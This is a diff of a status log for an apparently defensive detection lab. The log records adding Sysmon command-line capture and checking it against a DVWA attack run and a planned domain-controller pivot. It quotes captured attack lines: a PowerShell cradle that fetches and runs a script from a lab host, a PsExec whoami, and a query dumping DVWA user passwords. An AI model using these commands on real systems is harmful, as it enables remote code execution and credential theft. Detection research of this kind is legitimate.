@@ -4,19 +4,25 @@ Replace lines in place when status changes; no history. "Verified" = checked in 
 Branch: **`test-train-with-two-window-vm`** (from `main`). All work on the Proxmox VMs. The trainer checkout is **`main` `e40cac0`**
 since 2026-11-12 14:07Z (Ansible `ubuntu.yml --tags project`; unit and `/etc/nt2102-hosts.json` now match git).
 
-## 2026-11-13 Process command lines (Sysmon EID 1) for the UI + LLM (D14): code done, selftests pass, NOT deployed
+## 2026-11-13 Process command lines (Sysmon EID 1, D14): LIVE + verified on `ws-etw-0` (`67f3968`)
 
-Teammate's ask: process rows only showed `powershell.exe` / `cmd.exe`. Plan: `~/.claude/plans/my-friend-suggest-me-fluttering-swan.md`.
-- **Verified on `ws-etw-0`:** Sysmon v15.22 installed by the new role `win_sysmon` (EID 1 only; re-run changed=0). A `logman` ETW trace
-  of `Microsoft-Windows-Sysmon` returned EID 1 with full command lines, including a short-lived `whoami /all`.
-- **Code (selftests pass, `./selftest.sh` 20/20):** collector 4th optional provider `sysmon` (EID 1 only); `src/pipeline/cmdlines.py`
-  (PID + time join, `-enc` decode, redaction); engine → `node_cmdlines.csv` + UI detail; UI muted command line under each process;
-  `alg2.serialize` command-line lines before the event lines; neutral cradle names in `launch_exploit.py` / `rce-killchain.ps1`.
-  Converter, features and scores unchanged (no retrain).
-- **Not yet live** — order: (1) merge to `main` (the VM collector is a git clone of `main`); (2) `windows.yml --tags collector
-  --limit ws-etw-0` (etwlab.json gets the `sysmon` entry) + collector restart; (3) trainer `ubuntu.yml --tags project` + restart
-  `ocr-live`; (4) `kali.yml` (new stage paths); (5) e2e: Loki `{provider="sysmon"}` lines, a DVWA run shows decoded command lines in
-  the UI + LLM document, `converter_check` still `match`, a re-scored window's `scores.csv` identical. `ws-etw-1` afterwards.
+Teammate's ask: process rows only showed `powershell.exe` / `cmd.exe`, not which command ran. Fix (D14): Sysmon EID 1 (ProcessCreate)
+only, read by the collector as optional provider `sysmon`, joined to PROCESS nodes by PID + start time (`src/pipeline/cmdlines.py`,
+`-enc` decode + secret redaction). Shown in the UI tables + LLM document; **never a feature** → converter sha unchanged, no retrain.
+New role `win_sysmon`. Plan: `~/.claude/plans/my-friend-suggest-me-fluttering-swan.md`. Committed `67f3968` on this branch.
+- **Deployed (off the branch, `-e repo_branch=…`):** Sysmon v15.22 on `ws-etw-0`; collector redeployed (4th provider `sysmon`, its
+  VM selftest passed, 0 ETW events lost); trainer on `67f3968`, `ocr-live` restarted; Kali attack pack with neutral stage names
+  (`/u.ps1` `/s.ps1`, env `U_H/U_P/U_D`). `./selftest.sh` 20/20.
+- **Verified end-to-end (live, DC):** idle window `20261113T124000Z` **green**, 2 cmdlines matched. DVWA attack window
+  `20261113T124500Z` **red** (subgraph 51.7, Moderate), **LLM `attack` 0.93**, 77 cmdlines matched. UI process table shows the command
+  line under each process; the `-enc` cradle shows **decoded** (`$env:U_H=…;iex ((iwr http://10.21.4.30:8080/u.ps1…`); short-lived
+  LOLBins caught (`PsExec64 -s cmd /c whoami`, `ping 127.0.0.1`, `mysql … SELECT user,password FROM dvwa.users`). LLM doc carries the
+  command lines; **grep for lab words (`LAB_`/`killchain`/`attack-lib`/`attack-labels`) = clean**. `converter_check` = `match` (scores
+  unchanged). Loki `{provider="sysmon", host="ws-etw-0"}` flowing.
+- **Still owed:** `ws-etw-1` rollout (same path), then this reads "both hosts"; merge the branch to `main` (the VM collector normally
+  clones `main`; a backup of the 30 identical artifact files is `~/pre-d14-artifacts-backup.tgz` on the trainer).
+- **Caveat:** the LLM now sees more evidence, so **verdicts before/after D14 are not comparable** (D14). Command lines go to the
+  external LLM provider; redaction is pattern-based, not a guarantee.
 
 ## 2026-11-12 Topology correction + `ws-etw-0` DC retrain → `exp16-ws0` (two-VM live, verified)
 
@@ -89,17 +95,17 @@ Plan: `~/.claude/plans/hmm-forget-the-alert-async-wigderson.md`. User decisions 
   `ocr-live` 1.06 GB. Correlation on: 5 `link`, 0 suspected / confirmed (no `lab flows` baseline yet, so benign VM↔VM traffic counts as
   links). Label source for "0 red": operator assertion that nobody acted on either VM then. Not a soak, not a detection result.
 - **Rollback:** `lab hosts ws-etw-0 && sudo systemctl restart ocr-live` (assignments stay).
-- **NEXT ACTION (user, 2026-11-12): demo lateral movement `react2shell` (ws-etw-1) → DC (ws-etw-0)** — direction corrected from the
-  teammate's real topology (RCE the node.js web box first, then pivot to the Domain Controller) so the correlation layer (D13) fires on
-  real flows. Expected: `ws-etw-1` red (react2shell chain) + a `ws-etw-1 → ws-etw-0` flow (:445/:5985) + `ws-etw-0` red (pivot) →
-  correlation `link → suspected → confirmed`, LLM explains the full flow. Prereqs (plan §C/§D), in order: (a) `lab flows` baseline on a
-  clean range first, else benign VM↔VM AD traffic drowns the signal (5 benign links already seen); (b) build the scenario in
-  `src/atomic-attack-pack/` (DVWA-only today): a **react2shell exploit entry** (new auth/injection path; probe `10.21.3.11:3000` to find
-  the route) + a target-aware pivot using **on-host Windows built-ins** (net use / winrs / PsExec64 → the DC over SMB/WinRM, user Q2 —
-  no new Kali AD tooling) + **per-host labels** (today the label host is the constant `SimulatedW10`); (c) confirm the attack scores red
-  on **each** host before any claim (D6 risk: DC pivot auth can blend into legit AD traffic). Scope honesty: the pivot uses a known lab
-  credential (lateral-movement detection, not credential theft); DCSync/real cred-dump out of scope. This supersedes "cross-host attack
-  is the user's call; do not add unprompted" (two-host memory) — the user has now asked for it.
+- **NEXT ACTION (user, 2026-11-13): verify cross-host with the teammate's REAL attack** — `react2shell` (ws-etw-1) → DC (ws-etw-0),
+  so the correlation layer (D13) fires on real flows. **Changed 2026-11-13:** the attack is the **teammate's real one, not our injected
+  kill chain**, so we do **not** build a synthetic scenario in `src/atomic-attack-pack/` (the old prereq (b) is dropped) and there is
+  **no self-logged label oracle** (D6) — ground truth = the teammate's account + time window (operator assertion; blocks any P/R/F1
+  claim). Expected: `ws-etw-1` red (react2shell entry) + a `ws-etw-1 → ws-etw-0` flow (:445/:5985) + `ws-etw-0` red (pivot) →
+  correlation `link → suspected → confirmed`, LLM explains the full flow and cites the real command lines (D14). Prereqs, in order:
+  (a) roll Sysmon/D14 out to `ws-etw-1` so its entry commands show (user, 2026-11-13); (b) `lab flows` baseline on a clean range first,
+  else benign VM↔VM AD traffic drowns the signal (5 benign links already seen); (c) confirm the attack scores red on **each** host —
+  if react2shell's exploit or the DC pivot does not go red (D6 risk: node server + AD auth are in-distribution), that is a **finding to
+  report, not to hide**. Scope honesty: lateral movement with a known lab credential, not credential theft; DCSync/real cred-dump out of
+  scope. A network-focused attack-flow note for the teammate is at `docs/notes/cross-host-attack-flow.md` (the user's imagined path).
 - **Still owed alongside it:** 24 h soak of both hosts (red windows checked one by one); ask the teammate what turned NetBIOS on at
   11-09 09:19Z. The 11-10 14:50Z `ws-etw-0` reconciliation is **resolved** (true positive — the DVWA→RCE kill chain, see the exp16-ws0
   section above). The deliverables (deck, report, recorded demo) still show one VM (pre-DC); whether the lateral-movement demo joins them
